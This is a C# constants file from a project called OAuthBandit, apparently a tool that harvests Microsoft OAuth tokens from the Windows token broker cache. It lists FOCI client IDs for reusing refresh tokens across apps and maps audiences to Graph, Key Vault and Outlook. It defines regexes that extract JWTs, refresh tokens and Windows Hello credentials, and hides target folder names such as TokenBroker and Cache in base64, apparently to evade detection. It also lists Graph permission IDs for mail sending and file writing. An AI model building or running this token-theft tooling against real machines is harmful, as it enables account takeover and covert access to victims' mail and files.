using System.Text.RegularExpressions;

namespace OAuthBandit.Core;

public static class Constants
{
    // FOCI Applications - Can share refresh tokens across family (from Secureworks research)
    public static readonly Dictionary<string, string> FociApps = new(StringComparer.OrdinalIgnoreCase)
    {
        ["a40d7d7d-59aa-447e-a655-679a4107e548"] = "Accounts Control UI",
        ["14638111-3389-403d-b206-a6a71d9f8f16"] = "Copilot App",
        ["598ab7bb-a59c-4d31-ba84-ded22c220dbd"] = "Designer App",
        ["cde6adac-58fd-4b78-8d6d-9beaf1b0d668"] = "Global Secure Access Client",
        ["be1918be-3fe3-4be9-b32b-b542fc27f02e"] = "M365 Compliance Drive Client",
        ["eb20f3e3-3dce-4d2c-b721-ebb8d4414067"] = "Managed Meeting Rooms",
        ["04b07795-8ddb-461a-bbee-02f9e1bf7b46"] = "Microsoft Azure CLI",
        ["1950a258-227b-4e31-a9cf-717495945fc2"] = "Microsoft Azure PowerShell",
        ["4813382a-8fa7-425e-ab75-3b753aab3abb"] = "Microsoft Authenticator App",
        ["2d7f3606-b07d-41d1-b9d2-0d0c9296a6e8"] = "Microsoft Bing Search for Edge",
        ["cf36b471-5b44-428c-9ce7-313bf84528de"] = "Microsoft Bing Search",
        ["cab96880-db5b-4e15-90a7-f3f1d62ffe39"] = "Microsoft Defender Platform",
        ["dd47d17a-3194-4d86-bfd5-c6ae6f5651e3"] = "Microsoft Defender for Mobile",
        ["e9c51622-460d-4d3d-952d-966a5b1da34c"] = "Microsoft Edge",
        ["d7b530a4-7680-4c23-a8bf-c52c121d2e87"] = "Microsoft Edge Enterprise New Tab",
        ["82864fa0-ed49-4711-8395-a0e6003dca1f"] = "Microsoft Edge MSAv2",
        ["ecd6b820-32c2-49b6-98a6-444530e5a77a"] = "Microsoft Edge (variant 2)",
        ["f44b1140-bc5e-48c6-8dc0-5cf5a53c0e34"] = "Microsoft Edge (variant 3)",
        ["57fcbcfa-7cee-4eb1-8b25-12d2030b4ee0"] = "Microsoft Flow",
        ["9ba1a5c7-f17a-4de9-a1f1-6178c8d51223"] = "Microsoft Intune Company Portal",
        ["a670efe7-64b6-454f-9ae9-4f1cf27aba58"] = "Microsoft Lists App",
        ["0922ef46-e1b9-4f7e-9134-9ad00547eb41"] = "Microsoft Loop",
        ["d3590ed6-52b3-4102-aeff-aad2292ab01c"] = "Microsoft Office",
        ["66375f6b-983f-4c2c-9701-d680650f588f"] = "Microsoft Planner",
        ["c0d2a505-13b8-4ae0-aa9e-cddd5eab0b12"] = "Microsoft Power BI",
        ["844cca35-0656-46ce-b636-13f48b0eecbd"] = "Microsoft Stream Mobile",
        ["1fec8e78-bce4-4aaf-ab1b-5451cc387264"] = "Microsoft Teams",
        ["87749df4-7ccf-48f8-aa87-704bad0e0e16"] = "Microsoft Teams Device Admin",
        ["8ec6bc83-69c8-4392-8f08-b3c986009232"] = "Microsoft Teams-T4L",
        ["22098786-6e16-43cc-a27d-191a01a1e3b5"] = "Microsoft To-Do",
        ["eb539595-3fe1-474e-9c1d-feb3625d1be5"] = "Microsoft Tunnel",
        ["57336123-6e14-4acc-8dcf-287b6088aa28"] = "Microsoft Whiteboard",
        ["540d4ff4-b4c0-44c1-bd06-cab1782d582a"] = "ODSP Mobile Lists App",
        ["00b41c95-dab0-4487-9791-b9d2c32c80f2"] = "Office 365 Management",
        ["0ec893e0-5785-4de6-99da-4ed124e5296c"] = "Office UWP PWA",
        ["ab9b8c07-8f02-4f72-87fa-80105867a763"] = "OneDrive SyncEngine",
        ["af124e86-4e96-495a-b70a-90f90ab96707"] = "OneDrive iOS App",
        ["b26aadf8-566f-4478-926f-589f601d9c74"] = "OneDrive",
        ["e9b154d0-7658-433b-bb25-6b8e0a8a7c59"] = "Outlook Lite",
        ["27922004-5251-4030-b22d-91ecd9a37ea4"] = "Outlook Mobile",
        ["4e291c71-d680-4d0e-9640-0a3358e31177"] = "PowerApps",
        ["d326c1ce-6cc6-4de2-bebc-4591e5e13ef0"] = "SharePoint",
        ["f05ff7c9-f75a-4acd-a3b5-f4b6a870245d"] = "SharePoint Android",
        ["872cd9fa-d31f-45e0-9eab-6e460a02d1f1"] = "Visual Studio Legacy",
        ["26a7ee05-5602-4d76-a7ba-eae8b7b67941"] = "Windows Search",
        ["e9cee14e-f26a-4349-886f-10048e3ef4b8"] = "Yammer Android",
        ["b87b6fc6-536c-411d-9005-110ee6db77dc"] = "Yammer iPad",
        ["a569458c-7f2b-45cb-bab9-b7dee514d112"] = "Yammer iPhone",
        ["038ddad9-5bbe-4f64-b0cd-12434d1e633b"] = "ZTNA Network Access Client",
        ["d5e23a82-d7e1-4886-af25-27037a0fdc2a"] = "ZTNA Network Access Client M365",
        ["760282b4-0cfc-4952-b467-c8e0298fee16"] = "ZTNA Network Access Client Private",
    };

    // Other known Microsoft apps (non-FOCI)
    public static readonly Dictionary<string, string> OtherApps = new(StringComparer.OrdinalIgnoreCase)
    {
        ["0c1307d4-29d6-4389-a11c-5cbe7f65d7fa"] = "Azure Mobile App",
        ["29d9ed98-a469-4536-ade2-f981bc1d605e"] = "Microsoft Authentication Broker",
        ["00000003-0000-0000-c000-000000000000"] = "Microsoft Graph",
        ["de50c81f-5f80-4771-b66b-cebd28ccdfc1"] = "Microsoft Intune",
        ["26a4ae64-5862-427f-a9b0-044e62572a4f"] = "Intune Company Portal",
        ["fc0f3af4-6835-4174-b806-f7db311fd2f3"] = "Office Desktop",
        ["4765445b-32c6-49b0-83e6-1d93765276ca"] = "Office Mobile",
        ["268761a2-03f3-40df-8a8b-c3db24145b6b"] = "Microsoft Store",
        ["4b0964e4-58f1-47f4-a552-e2e1fc56dcd7"] = "Microsoft Edge Legacy",
        ["5e3ce6c0-2b1f-4285-8d4b-75ee78787346"] = "Microsoft Teams Mobile",
        ["cc15fd57-2c6c-4117-a88c-83b1d56b4bbe"] = "Microsoft Teams Web",
    };

    // GUID audience → Resource URL normalization (critical for correct API routing)
    public static readonly Dictionary<string, string> AudienceToResource = new(StringComparer.OrdinalIgnoreCase)
    {
        ["cfa8b339-82a2-471a-a3c9-0fc0be7a4093"] = "https://vault.azure.net",
        ["00000003-0000-0000-c000-000000000000"] = "https://graph.microsoft.com",
        ["00000002-0000-0000-c000-000000000000"] = "https://graph.windows.net",
        ["797f4846-ba00-4fd7-ba43-dac1f8f63013"] = "https://management.azure.com",
        ["00000002-0000-0ff1-ce00-000000000000"] = "https://outlook.office365.com",
        ["00000003-0000-0ff1-ce00-000000000000"] = "https://microsoft.sharepoint.com",
    };

    // Known audiences for routing
    public static readonly Dictionary<string, string> KnownAudiences = new(StringComparer.OrdinalIgnoreCase)
    {
        ["https://graph.microsoft.com"] = "Graph API",
        ["https://graph.windows.net"] = "AAD Graph (legacy)",
        ["https://management.azure.com"] = "Azure Management",
        ["https://vault.azure.net"] = "Azure Key Vault",
        ["https://outlook.office365.com"] = "Outlook API",
        ["https://api.spaces.skype.com"] = "Skype/Teams API",
        ["https://chatsvcagg.teams.microsoft.com"] = "Teams Chat API",
    };

    public static readonly HashSet<string> AllMicrosoftAppIds;
    public static readonly HashSet<string> FociClientIds;

    static Constants()
    {
        AllMicrosoftAppIds = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
        FociClientIds = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
        
        foreach (var kvp in FociApps)
        {
            AllMicrosoftAppIds.Add(kvp.Key);
            FociClientIds.Add(kvp.Key);
        }
        foreach (var kvp in OtherApps)
            AllMicrosoftAppIds.Add(kvp.Key);
    }

    public static bool IsFociApp(string clientId) => FociClientIds.Contains(clientId);
    
    public static string GetAppName(string clientId)
    {
        if (FociApps.TryGetValue(clientId, out var name)) return name;
        if (OtherApps.TryGetValue(clientId, out name)) return name;
        return clientId.Length > 12 ? clientId[..12] + "..." : clientId;
    }

    public static string NormalizeAudience(string? audience, string? requestedScope = null)
    {
        if (string.IsNullOrEmpty(audience)) return audience ?? "";
        
        // Already a URL - return as-is (trimmed)
        if (audience.StartsWith("http://") || audience.StartsWith("https://"))
            return audience.TrimEnd('/');
        
        // Check if it's a known GUID that should be mapped to URL
        if (AudienceToResource.TryGetValue(audience, out var resource))
            return resource;
        
        // Fallback: try to extract from requested scope
        if (!string.IsNullOrEmpty(requestedScope))
        {
            if (requestedScope.EndsWith("/.default"))
                return requestedScope.Replace("/.default", "").TrimEnd('/');
            if (requestedScope.StartsWith("https://"))
                return requestedScope.TrimEnd('/');
        }
        
        return audience;
    }

    public static readonly string[] MicrosoftScopes = {
        "https://graph.microsoft.com", "https://outlook.office.com",
        "https://outlook.office365.com", "https://sharepoint.com",
        "https://microsoft.sharepoint.com", "https://teams.microsoft.com",
        "https://onedrive.com", "https://management.azure.com",
        "https://vault.azure.net",
        "Mail.Read", "Mail.Send", "Files.Read", "Files.ReadWrite",
        "Sites.Read", "User.Read", "offline_access"
    };

    public static readonly Regex JwtPattern = new(@"(eyJ[A-Za-z0-9_\-]{20,}\.eyJ[A-Za-z0-9_\-]{20,}\.[A-Za-z0-9_\-]*)", RegexOptions.Compiled);
    public static readonly Regex RefreshTokenPattern = new(@"(1\.A[A-Za-z0-9][A-Za-z0-9_\-.]{200,})", RegexOptions.Compiled);
    // ngc = next generation credential (windows hello keys)
    public static readonly Regex NgcTokenPattern = new(@"(AQAAAAEAAAABAAAA[A-Za-z0-9+/=]{50,})", RegexOptions.Compiled);
    public static readonly Regex EmailPattern = new(@"([a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})", RegexOptions.Compiled);
    public static readonly Regex GuidPattern = new(@"([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})", RegexOptions.Compiled | RegexOptions.IgnoreCase);
    // fallback: any big base64 blob in tbres files
    public static readonly Regex LargeBase64Pattern = new(@"([A-Za-z0-9+/=]{500,})", RegexOptions.Compiled);

    // Encoded paths
    public const string EncodedMicrosoft = "TWljcm9zb2Z0";
    public const string EncodedTokenBroker = "VG9rZW5Ccm9rZXI=";
    public const string EncodedCache = "Q2FjaGU=";
    public const string EncodedPackages = "UGFja2FnZXM=";
    public const string EncodedBrokerPlugin = "QnJva2VyUGx1Z2lu";
    public const string EncodedLocalState = "TG9jYWxTdGF0ZQ==";
    public const string EncodedPublisher = "Q049TWljcm9zb2Z0IFdpbmRvd3MsIE89TWljcm9zb2Z0IENvcnBvcmF0aW9uLCBMPVJlZG1vbmQsIFM9V2FzaGluZ3RvbiwgQz1VUw==";

    public const string GraphAppId = "00000003-0000-0000-c000-000000000000";

    public static readonly Dictionary<string, string> GraphPermissionIds = new()
    {
        ["Mail.Read"] = "810c84a8-4a9e-49e6-bf7d-12d183f40d01",
        ["Mail.ReadWrite"] = "e2a3a72e-5f79-4c64-b1b1-878b674786c9",
        ["Files.ReadWrite.All"] = "75359482-378d-4052-8f01-80520e7db3cd",
        ["User.Read.All"] = "df021288-bdef-4463-88db-98f22de89214",
        ["Directory.Read.All"] = "7ab1d382-f21e-4acd-a863-ba3e13f7da61",
        ["Mail.Send"] = "b633e1c5-b582-4048-a93e-9f11b44c7e96",
        ["Sites.ReadWrite.All"] = "9492366f-7969-46a4-8d15-ed1a20078fff",
    };
}
